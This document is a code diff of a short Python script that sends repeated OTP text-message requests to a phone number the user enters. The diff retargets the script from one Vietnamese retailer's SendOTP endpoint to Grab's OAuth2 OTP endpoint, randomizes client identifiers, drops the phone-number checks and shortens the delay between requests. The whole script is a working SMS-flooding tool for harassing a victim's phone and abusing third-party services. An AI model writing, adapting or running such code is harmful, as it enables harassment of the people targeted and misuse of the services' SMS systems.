@@ -1,32 +1,30 @@
 import requests
 import json
 import time
+import random
+
+def string_rand(length=5):
+    consonants="1234567890qwertyuiopasdfghjklzxcvbnm"
+    vowels="aeiou"
+    return "".join(random.choice((consonants,vowels)[i%2]) for i in range(length))
 
 s = requests.Session()
-u = 'https://www.bachhoaxanh.com/aj/Customer/SendOTP'
+u = 'https://partner-api.grab.com/grabid/v1/oauth2/otp'
 i = 1
 l = 100 # 100 lần
 
 print('Enter phone..')
 p = input()
 
-if not p:
-    print('Phone is empty')
-    exit()
-if len(p) < 10:
-    print('Is not phone')
-    exit()
-
-payload = { 'phone': p, 'objectId': 'df99b1e8-11f1-4eca-b254-beff72deefbe', 'type': 4 }  
+payload = { 'client_id': string_rand(32),'country_code': 'VN','ctx_id': string_rand(32),'method': 'SMS', 'num_digits': 6, 'phone_number' : '84' + p, 'scope': 'openid profile.read foodweb.order foodweb.rewastring_rand foodweb.get_enterprise_profile'}  
 
 while (i < l) :
     respone = s.post(u, data=payload, allow_redirects=False)
 
-    jsons = json.loads(respone.text)
+    #jsons = json.loads(respone.text)
 
-    print('Lần: ',i,jsons['Msg'])
+    print('Lần: ',i,respone)
 
     i = i + 1
 
-    time.sleep(181) # 3p + 1s delay
-
+    time.sleep(40) 
